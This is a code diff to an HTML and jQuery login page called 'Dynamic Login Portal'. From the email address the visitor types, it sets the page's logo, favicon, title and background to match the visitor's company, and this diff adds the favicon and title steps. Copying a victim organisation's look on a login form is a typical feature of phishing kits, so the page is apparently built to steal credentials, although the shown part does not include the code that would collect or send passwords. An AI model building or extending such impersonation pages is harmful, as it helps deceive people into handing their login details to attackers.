@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dynamic Login Portal</title>
+    <title id="page-title">Dynamic Login Portal</title>
+    <link rel="icon" id="favicon" href="">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -28,7 +29,9 @@
 </head>
 <body>
     <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md login-container">
-        <img id="logoimg" src="" alt="Company Logo" class="mx-auto mb-4 h-16 hidden">
+        <div class="flex justify-center items-center mb-4">
+            <img id="logoimg" src="" alt="Company Logo" class="h-16 hidden">
+        </div>
         <h2 id="logoname" class="text-2xl font-bold text-center mb-2 capitalize"></h2>
         <p class="email text-center text-gray-600 mb-4"></p>
         <form id="login-form">
@@ -96,6 +99,8 @@
                 if (!email) {
                     $('#error').text('Please enter an email').show();
                     $('#logoimg, #logoname, .email').addClass('hidden');
+                    $('#favicon').attr('href', '');
+                    $('#page-title').text('Dynamic Login Portal');
                     document.body.style.backgroundImage = '';
                     console.log('No email provided');
                     return;
@@ -105,6 +110,8 @@
                 if (!emailRegex.test(email)) {
                     $('#error').text('Invalid email format').show();
                     $('#logoimg, #logoname, .email').addClass('hidden');
+                    $('#favicon').attr('href', '');
+                    $('#page-title').text('Dynamic Login Portal');
                     document.body.style.backgroundImage = '';
                     console.log('Invalid email:', email);
                     return;
@@ -112,7 +119,16 @@
 
                 const domain = email.split('@')[1];
                 const domainWithoutTld = domain.split('.')[0];
-                console.log('Domain:', domain, 'Domain without TLD:', domainWithoutTld);
+                const pageTitle = domainWithoutTld.charAt(0).toUpperCase() + domainWithoutTld.slice(1);
+                console.log('Domain:', domain, 'Domain without TLD:', domainWithoutTld, 'Page Title:', pageTitle);
+
+                // Set favicon
+                const faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}`;
+                $('#favicon').attr('href', faviconUrl);
+                console.log('Favicon URL:', faviconUrl);
+
+                // Set page title
+                $('#page-title').text(pageTitle);
 
                 // Set logo
                 const logoUrl = `https://logo.clearbit.com/${domain}`;
